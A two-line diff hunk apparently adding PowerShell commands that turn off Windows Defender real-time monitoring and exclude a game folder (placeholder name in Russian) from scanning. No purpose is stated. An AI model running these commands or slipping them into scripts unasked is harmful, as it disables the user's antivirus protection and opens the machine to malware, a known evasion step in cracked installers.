@@ -1,0 +1,2 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "C:\Program Files (x86)\НазваниеИгры"
